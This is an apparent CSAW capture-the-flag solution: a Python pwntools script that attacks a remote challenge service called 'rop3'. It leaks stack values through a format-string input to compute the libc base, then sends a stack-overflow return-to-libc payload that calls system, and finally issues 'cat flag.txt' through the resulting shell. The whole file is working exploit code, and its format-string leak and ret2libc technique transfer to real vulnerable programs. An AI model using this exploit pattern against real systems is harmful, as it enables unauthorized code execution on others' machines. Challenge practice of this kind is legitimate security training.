from pwn import *
debug = False

#Connect to server
if debug:
    sock = process("rop3")
else:
    sock = remote("misc.chal.csaw.io", 8004)
sock.recvline() #Clean prompt
xploit = ""
#arg = "80485d0" #The System call we want
arg = "d0850408" #Endienness

#Offsets
if debug:
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
    libc = ELF('libc-2.19.so')
sysOff = int(str(hex(libc.symbols["system"])), 16)
extOff = int(str(hex(libc.symbols["exit"])), 16)
ptfOff = int(str(hex(libc.symbols["printf"])), 16)

#Strip some data from the stream, calculate buffer location and system location
firstLayerBreak = "%x %8x %8x"
sock.sendline(firstLayerBreak)

#Base of libc
sock.recvuntil(" ") #Skip first popback
sock.recvuntil(" ") #Skip second popback
base = int(sock.recv(8), 16) #Get address
baseOffset = 0
baseOffset += 47
baseOffset += ptfOff
base -= baseOffset

#Calculate location of SYSTEM function
systemAddress = str(hex(base + sysOff))[2:]
systemAddress = systemAddress[6:8] + systemAddress[4:6] + systemAddress[2:4] + systemAddress[0:2] #Reformat
#Calculate location of EXIT function
exitAddress = str(hex(base + extOff))[2:]
exitAddress = exitAddress[6:8] + exitAddress[4:6] + exitAddress[2:4] + exitAddress[0:2] #Reformat

# Packet: overflow, stack frame overwrate, return overwrite, return return
xploit += '00'.decode("hex")*0x2c
xploit += systemAddress.decode("hex")
xploit += exitAddress.decode("hex")
xploit += arg.decode("hex")

sock.sendline(xploit)
sock.sendline("cat flag.txt")
#sock.sendline("ls") #Debug Line Only
#sock.sendline("exit") #Debug Line Only
print(sock.recvall())

################################################################################
target = open("target", "w")
target.write(xploit)
target.close()
